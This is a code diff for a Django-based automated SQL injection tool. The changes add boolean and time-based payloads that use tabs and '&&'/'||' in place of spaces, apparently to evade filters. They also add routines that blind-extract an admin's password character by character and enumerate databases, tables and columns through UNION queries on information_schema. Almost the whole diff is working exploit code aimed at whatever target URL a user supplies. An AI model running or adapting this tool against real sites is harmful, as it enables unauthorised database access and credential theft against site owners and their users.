@@ -1,17 +1,20 @@
 import json
+from typing import List
+
 import requests
 from bs4 import BeautifulSoup
 from .models import list
 from ast import literal_eval
 from django.shortcuts import render
 from django.contrib import messages
-from .utils import findUserKeyword, sendQuery
+from .utils import findUserKeyword, sendQuery,sendQuery2
 
 
 def checkAttackAble(dicQuery):
     attack_querys = '\n'
     for i in range(1, 3):
-        res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f"' and 1={i}-- "})
+        res = sendQuery(dicQuery, {
+            dicQuery['name']:  f"'	&&	1={i}--	" })
         result = findUserKeyword(res, dicQuery['find'])
 
         if result[0] == 1:
@@ -21,7 +24,8 @@ def checkAttackAble(dicQuery):
             return 1, attack_querys, start
 
         else:
-            res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f"' or 1={i}-- "})
+            res = sendQuery(dicQuery, {
+                dicQuery['name']: f"'	||	1={i}--	"})
             result = findUserKeyword(res, dicQuery['find'])
             print(result)
 
@@ -30,9 +34,19 @@ def checkAttackAble(dicQuery):
                 start = str(dicQuery['parameter']) + "'"
                 print(2, attack_querys, start)
                 return 1, attack_querys, start
+            else :
+                res = sendQuery(dicQuery, {
+                    dicQuery['name']: dicQuery['parameter'] + f"'	||	1	in	(1)--	"})
+                result = findUserKeyword(res, dicQuery['find'])
+                if result[0] == 1:
+                    attack_querys += result[1] + '\n'
+                    start = str(dicQuery['parameter']) + "'"
+                    return 1, attack_querys, start
+
 
     for i in range(1, 3):
-        res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f'" and 1={i}-- '})
+        res = sendQuery(dicQuery, {
+            dicQuery['name']: dicQuery['parameter'] + f'"	&&	1={i}--	' })
         result = findUserKeyword(res, dicQuery['find'])
 
         if result[0] == 1:
@@ -41,7 +55,8 @@ def checkAttackAble(dicQuery):
             print(3, attack_querys, start)
             return 2, attack_querys, start
         else:
-            res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f'" or 1={i}-- '})
+            res = sendQuery(dicQuery, {
+                dicQuery['name']: dicQuery['parameter'] + f'"	||	1={i}--	' })
             result = findUserKeyword(res, dicQuery['find'])
 
             if result[0] == 1:
@@ -50,9 +65,18 @@ def checkAttackAble(dicQuery):
                 start = str(dicQuery['parameter']) + '"'
                 print(4, attack_querys, start)
                 return 2, attack_querys, start
+            else:
+                res = sendQuery(dicQuery, {
+                    dicQuery['name']: dicQuery['parameter'] + f'"	||	1	in	(1)--	'})
+                result = findUserKeyword(res, dicQuery['find'])
+                if result[0] == 1:
+                    attack_querys += result[1] + '\n'
+                    start = str(dicQuery['parameter']) + '"'
+                    return 2, attack_querys, start
 
     for i in range(1, 3):
-        res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f' and 1={i}-- '})
+        res = sendQuery(dicQuery, {
+            dicQuery['name']: dicQuery['parameter'] + f'	&&	1={i}--	'})
         result = findUserKeyword(res, dicQuery['find'])
 
         if result[0] == 1:
@@ -60,17 +84,58 @@ def checkAttackAble(dicQuery):
             start = str(dicQuery['parameter'])
             print(5, attack_querys, start)
             return 3, attack_querys, start
+
         else:
-            res = sendQuery(dicQuery, {dicQuery['name']: dicQuery['parameter'] + f' or 1={i}-- '})
+            res = sendQuery(dicQuery, {
+                dicQuery['name']: dicQuery['parameter'] + f'	||	1={i}--	'})
             result = findUserKeyword(res, dicQuery['find'])
+            if result[0] != 1:
+                res = sendQuery(dicQuery, {
+                    dicQuery['name']: dicQuery['parameter'] + f'-999	||	1={i}--	'})
+                result = findUserKeyword(res, dicQuery['find'])
+
 
         if result[0] == 1:
             attack_querys += result[1] + '\n'
             start = str(dicQuery['parameter'])
             print(6, attack_querys, start)
             return 3, attack_querys, start
+        else:
+            res = sendQuery(dicQuery, {
+                dicQuery['name']: dicQuery['parameter'] + f"-999	||	1	in	(1)--	"})
+            result = findUserKeyword(res, dicQuery['find'])
+            if result[0] == 1:
+                attack_querys += result[1] + '\n'
+                start = str(dicQuery['parameter'])+'-9999'
+                return 3, attack_querys, start
 
-    return -1, '', ''
+
+    res = sendQuery2(dicQuery, {
+        dicQuery['name']: dicQuery['parameter'] + f'"	||	1=1	&&	sleep(10)--	'})
+    if res == 1 :
+        start = str(dicQuery['parameter']) + '"'
+        return 2, attack_querys, start
+    res = sendQuery2(dicQuery, {
+        dicQuery['name']: dicQuery['parameter'] + f"'	||	1=1	&&	sleep(10)--	"})
+    if res == 1:
+        start = str(dicQuery['parameter']) + "'"
+        return 1, attack_querys, start
+    res = sendQuery2(dicQuery, {
+        dicQuery['name']: dicQuery['parameter'] + f'"	&&	1=1	&&	sleep(10)--	'})
+    if res == 1:
+        start = str(dicQuery['parameter']) + '"'
+        return 2, attack_querys, start
+    res = sendQuery2(dicQuery, {
+        dicQuery['name']: dicQuery['parameter'] + f"'	&&	1=1	&&	sleep(10)--	"})
+    if res == 1:
+        start = str(dicQuery['parameter']) + "'"
+        return 1, attack_querys, start
+
+
+
+
+
+    return '', '', ''
 
 
 def exploit2 (dicQuery, query):
@@ -106,12 +171,13 @@ def retry(request):
             return render(request, 'injection/result.html', {'ttt': testtest, 'f': '1'})
 
 
-def brute(start,dicQuery,attack_querys):
+def brute(start,dicQuery,attack_querys,know):
     length = 0
     getvalue = []
     n = int(dicQuery['range'])
     for i in range(1, n):
-        res = sendQuery(dicQuery, {dicQuery['name']: str(start) + f" or id='admin' and length(" + dicQuery['name'] + f")={i}-- "})
+        res = sendQuery(dicQuery, {
+            dicQuery['name']: str(start) + f"	||	id='admin'	&&	length(" + know + f")={i}--	"})
         result = findUserKeyword(res, dicQuery['find'])
         print(result)
         if result[0] == 1:
@@ -121,7 +187,8 @@ def brute(start,dicQuery,attack_querys):
     if length != 0:
         for i in range(1, length + 1):
             for j in range(1, 9):
-                res = sendQuery(dicQuery, {dicQuery['name']:  str(start) + " or id='admin' and length(substr(" + dicQuery['name'] + f",{i},1))={j}-- "})
+                res = sendQuery(dicQuery, {
+                    dicQuery['name']:  str(start) + "	||	id='admin'	&& length(substr(" + know + f",{i},1))={j}--	"})
                 result = findUserKeyword(res, dicQuery['find'])
                 print(result)
                 if result[0] == 1:
@@ -134,11 +201,13 @@ def brute(start,dicQuery,attack_querys):
         print('length', length)
         print(getvalue)
 
-        for j in range(1, length + 1):
+        for j in range(1, len(getvalue) + 1):
+            print(j,len(getvalue))
             pw = ''
             bit = 8 * getvalue[j - 1]
             for i in range(1, bit + 1):
-                res = sendQuery(dicQuery, {dicQuery['name']:  str(start) + " or id='admin' and substr(lpad(bin(ord(substr(" + dicQuery['name'] + f",{j},1))),{bit},0),{i},1)=1-- "})
+                res = sendQuery(dicQuery, {
+                    dicQuery['name']:  str(start) + "	||	id='admin'	&&	substr(lpad(bin(ord(substr(" + know + f",{j},1))),{bit},0),{i},1)=1--	"})
                 result = findUserKeyword(res, dicQuery['find'])
                 attack_querys += result[1] + '\n'
                 try:
@@ -156,9 +225,133 @@ def brute(start,dicQuery,attack_querys):
             print("pw: %s" % (pw_result))
 
 
-        return pw_result,attack_querys
+        return pw_result,attack_querys,length
     else :
-        return '', attack_querys
+        db_query = list.objects.filter(stand='query')
+        for i in db_query :
+            res = sendQuery(dicQuery, {
+                dicQuery['name']: start + str(i)})
+            result = findUserKeyword(res, dicQuery['find'])
+
+            if result[0] == 1:
+                attack_querys += result[1] + '\n'
+                return i, attack_querys,length
+
+        return '', attack_querys,length
+
+def brute2(start,dicQuery,attack_querys,pw_len,know):
+    pw =''
+    if pw_len == 0 :
+        n = int(dicQuery['range'])
+        for i in range(n + 1):
+            res = sendQuery(dicQuery, {
+                dicQuery['name']: str(start) + f"	||	id	in	('admin')	&&	length(" + know + f")>{i}--	"})
+            result = findUserKeyword(res, dicQuery['find'])
+            print(result)
+            if result[0] == 0:
+                st = "'"
+                attack_querys += result[1] + '\n'
+                length = i
+                pw_len = i
+                break
+
+
+    if pw_len == 0 :
+        n = int(dicQuery['range'])
+        for i in range(n + 1):
+            res = sendQuery(dicQuery, {
+                dicQuery['name']: str(start) + f'	||	id	in	("admin")	&&	length(' + know + f')>{i}--	'})
+            result = findUserKeyword(res, dicQuery['find'])
+            print(result)
+            if result[0] == 0:
+                st = '"'
+                attack_querys += result[1] + '\n'
+                length = i
+                pw_len = i
+                break
+
+
+    getvalue = []
+    for i in range(1,pw_len+1):
+        for j in range(20,int(dicQuery['range'])+100):
+            res = sendQuery(dicQuery, {
+                dicQuery['name']: str(start) + f"	||	id=" + st + 'admin' + st + f"	&&	ascii(mid("+ know + f",{i},1))={j}--	"})
+            result = findUserKeyword(res, dicQuery['find'])
+            print(result)
+            if result[0] == 1:
+                attack_querys += result[1] + '\n'
+                pw += chr(j)
+                print(pw)
+                break
+        if pw =='':
+            break
+    print(pw,'최종pw값')
+
+    if pw == '' :
+        for i in range(1, pw_len + 1):
+            for j in range(20, int(dicQuery['range']) + 100):
+                res = sendQuery(dicQuery, {
+                    dicQuery['name']: str(start) + f"	||	id	in	("+ st + 'admin'+ st +f")	&&	ascii(mid("+ know + f",{i},1))>{j}--	"})
+                result = findUserKeyword(res, dicQuery['find'])
+                print(result)
+                if result[0] == 0 :
+                    if j == 20:
+                        break
+                    attack_querys += result[1] + '\n'
+                    pw += chr(j)
+                    print(pw)
+                    break
+            if pw == '':
+                break
+
+
+        if pw == '':
+            if length != 0:
+                for i in range(1, length + 1):
+                    for j in range(1, 9):
+                        res = sendQuery(dicQuery, {
+                            dicQuery['name']: str(start) + "	||	id	in	("+ st +'admin'+ st + f")	&&	length(mid(" + know + f",{i},1))>{j}--	"})
+                        result = findUserKeyword(res, dicQuery['find'])
+                        print(result)
+                        if result[0] == 0:
+                            attack_querys += result[1] + '\n'
+                            getvalue.append(j)
+                            break
+
+                pw_result = ''
+                a = []
+                print('length', length)
+                print(getvalue)
+
+
+
+                for j in range(1, len(getvalue) + 1):
+                    print(j, len(getvalue))
+                    pw = ''
+                    bit = 8 * getvalue[j - 1]
+                    for i in range(1, bit + 1):
+                        res = sendQuery(dicQuery, {
+                            dicQuery['name']: str(start) + "	||	id	in	("+ st +'admin'+ st +f")	&&	mid(lpad(bin(ord(mid(" +
+                                              know + f",{j},1))),{bit},0),{i},1)>0--	"})
+                        result = findUserKeyword(res, dicQuery['find'])
+                        attack_querys += result[1] + '\n'
+                        try:
+                            if result[0] == 1:
+                                pw += '1'
+                            else:
+                                pw += '0'
+                        except:
+                            import traceback
+                            print(traceback.format_exc())
+
+                        print(pw)
+                    a.append(pw)
+                    pw_result += chr(int(pw, 2))
+                    print("pw: %s" % (pw_result))
+
+                return pw_result, attack_querys
+
+    return pw,attack_querys
 
 
 
@@ -169,10 +362,10 @@ def db_union(dicQuery,start):
     print(db_union)
     for i in db_union:
         print(i)
-        res = sendQuery(dicQuery, {dicQuery['name']: start + ' ' + str(i)})
+        res = sendQuery(dicQuery, {dicQuery['name']: start + ' ' + str(i)+' && sleep(10)--	'})
         print(res.url)
-        result = findUserKeyword(res, dicQuery['find'])
-        if result[0] == 1 :
+        if res == 1 :
+            print('1')
             cnt = 1
             while True :
 
@@ -182,32 +375,42 @@ def db_union(dicQuery,start):
 
                     for k in db_union:
                         find_list_text = []
-                        res = sendQuery(dicQuery, {dicQuery['name']: start + ' '+ str(k)})
+                        res = sendQuery(dicQuery, {
+                            dicQuery['name']: start + ' '+ str(k)})
                         page = BeautifulSoup(res.text, 'html.parser')
 
 
-                        #print(find_list)
+                        print(page)
 
                         for find_text in page.select('div'):
                             find_list_text.append(find_text.text.replace('\n',''))
-                        #print(find_list_text)
+                        print('check',find_list_text)
+
+                        '''
+
+                        if len(find_list_text) == 0:
+                            for find_text in page.select('h2'):
+                                find_list_text.append(find_text.text.replace('\n', ''))
+                            print('check', find_list_text)
+                        '''
 
                         for j in range(1, cnt):
                             print('들어왔음요')
                             for tmp in range(len(find_list_text)):
-                                #print(j,find_list_text[tmp])
+                                print(j,find_list_text[tmp])
                                 if str(j) == find_list_text[tmp]:
                                     print('같은 원소 찾음요')
-                                    #print(j,find_list_text[tmp])
+                                    print(j,find_list_text[tmp])
                                     index = tmp
                                     print(index)
 
                                     result_list_text = []
                                     k_new = str(k).replace(f'{j}','database()')
-                                    res = sendQuery(dicQuery, {dicQuery['name']: start + ' ' + k_new})
+                                    res = sendQuery(dicQuery, {
+                                        dicQuery['name']: start + ' ' + k_new})
                                     page = BeautifulSoup(res.text, 'html.parser')
 
-                                    for find_text in page.select('div'):
+                                    for find_text in page.select('span'):
                                         result_list_text.append(find_text.text.replace('\n', ''))
 
                                     print(result_list_text[index])
@@ -219,7 +422,8 @@ def db_union(dicQuery,start):
                                     k_new = k_new.replace('-- ',f' from information_schema.tables where table_schema="{db_name}"-- ')
                                     print(k_new)
 
-                                    res = sendQuery(dicQuery, {dicQuery['name']: start + ' ' + k_new})
+                                    res = sendQuery(dicQuery, {
+                                        dicQuery['name']: start + ' ' + k_new})
                                     page = BeautifulSoup(res.text, 'html.parser')
 
 
@@ -376,7 +580,7 @@ def table_name(dicQuery,start,db_name):
 
 
 def column_name(dicQuery,start,table_name):
-    column_name_result = []
+    column_name_result = {}
     for tb_name in table_name :
         column_name = []
         n = int(dicQuery['range'])
@@ -410,7 +614,7 @@ def column_name(dicQuery,start,table_name):
         getvalue = []
         print(len(column_name_length))
         n = len(column_name_length)
-        if len == 0:
+        if n == 0:
             return ''
         for i in range(n):
             tmp = []
@@ -453,7 +657,7 @@ def column_name(dicQuery,start,table_name):
 
         #print(column_name)
 
-        column_name_result.append(column_name)
+        column_name_result[tb_name] = column_name
 
     print(column_name_result)
 
@@ -484,9 +688,8 @@ def main(request):
         name = request.POST.get("name", False)
         method = request.POST.get("method", False)
         parameter = request.POST.get("parameter", False)
-        range = request.POST.get("slider",False)
-
-        print(range)
+        slider = request.POST.get("slider",False)
+        know = request.POST.get("know",False)
 
 
         user_query['url'] = url
@@ -495,7 +698,9 @@ def main(request):
         user_query['name'] = name
         user_query['method'] = method
         user_query['parameter'] = parameter
-        user_query['range'] = range
+        user_query['range'] = slider
+        user_query['know'] = know
+
 
         a, value, start = checkAttackAble(user_query)
         print('start',start)
@@ -503,11 +708,27 @@ def main(request):
         print('value', value)
 
 
+
         column_cnt = ''
         db_name = ''
         table = ''
-        if a != -1 :
-            pw, value = brute(start, user_query, value)
+        column = ''
+        pw = {}
+
+        attack = user_query['know'].split(',')
+
+        for know in attack :
+
+            pw[know], value,length = brute(start, user_query, value, know)
+            print(pw,'확인 1 --------------')
+            #print(bin(ord(pw)),'확인-------------')
+            #print(len(pw),'pw_length')
+
+
+            if pw[know] == '        ' or pw[know] == '                ' or pw[know] == '                        ' or pw[know] == '':
+                pw[know], value =  brute2(start,user_query,value,length,know)
+
+
 
         column_cnt,db_name = db_union(user_query,start)
         print(db_name)
@@ -520,10 +741,12 @@ def main(request):
 
         List = list.objects.order_by()
 
-        if (a >= -1):
+        print(pw,'확인 -----------')
+
+        if (a != ''):
             if (a == 1):
                 return render(request, 'injection/result.html',
-                              {'data': value, 'double': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt, 'db_name': db_name,'table_name': table, 'column_name' : column})
+                              {'data': value, 'double': '1', 'origin': str(user_query), 'list': List, 'pw' : pw, 'db_name': db_name,'table_name': table, 'column_name' : column})
             elif (a == 2):
                 return render(request, 'injection/result.html',
                               {'data': value, 'single': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt, 'db_name': db_name,'table_name': table,'column_name' : column})
@@ -531,7 +754,7 @@ def main(request):
                 return render(request, 'injection/result.html',
                               {'data': value, 'integer': '1', 'origin': str(user_query), 'list': List, 'pw' : pw,'column_cnt':column_cnt, 'db_name': db_name,'table_name': table, 'column_name' : column})
 
-    else:
-        return render(request, 'injection/index.html', {})
+        else:
+            return render(request, 'injection/result.html',{'data': value,'list': List, 'origin': str(user_query), 'pw' : pw,'column_cnt':column_cnt, 'db_name': db_name,'table_name': table, 'column_name' : column})
 
     return 1
